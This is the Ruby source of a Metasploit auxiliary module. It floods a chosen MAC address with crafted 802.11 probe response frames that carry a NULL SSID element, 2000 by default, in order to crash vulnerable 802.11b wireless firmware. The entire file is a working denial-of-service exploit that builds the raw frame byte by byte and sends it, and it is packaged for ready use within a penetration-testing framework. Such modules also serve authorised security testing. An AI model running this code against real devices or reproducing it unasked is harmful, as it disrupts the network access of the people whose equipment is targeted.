##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Multiple Wireless Vendor NULL SSID Probe Response',
      'Description'    => %q{
        This module exploits a firmware-level vulnerability in a variety of
        802.11b devices. This attack works by sending a probe response frame
        containing a NULL SSID information element to an affected device. This
        flaw affects many cards based on the Choice MAC (Intersil, Lucent, Agere,
        Orinoco, and the first generation of Airport cards).
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
      [
        ['URL', 'http://802.11ninja.net/papers/firmware_attack.pdf'],
        ['WVE', '2006-0064']
      ]
    ))
    register_options(
      [
        OptInt.new('COUNT', [ true, "The number of frames to send", 2000]),
        OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
      ], self.class)
  end

  def run
    open_wifi

    cnt = datastore['COUNT'].to_i

    print_status("Creating malicious probe response frame...")
    frame = create_frame()

    print_status("Sending #{cnt} frames...")
    cnt.times { wifi.write(frame) }
  end

  def create_frame
    bssid    = Rex::Text.rand_text(6)
    seq      = [rand(255)].pack('n')
    caps     = [rand(65535)].pack('n')

    frame =
      "\x50" +                      # type/subtype
      "\x00" +                      # flags
      "\x00\x00" +                  # duration
      eton(datastore['ADDR_DST']) + # dst
      bssid +                       # src
      bssid +                       # bssid
      seq   +                       # seq
      Rex::Text.rand_text(8) +      # timestamp value
      Rex::Text.rand_text(2) +      # beacon interval
      Rex::Text.rand_text(2) +      # capabilities
      [0, 0].pack('CC')             # Type=SSID(0) Length=0

    return frame

  end
end
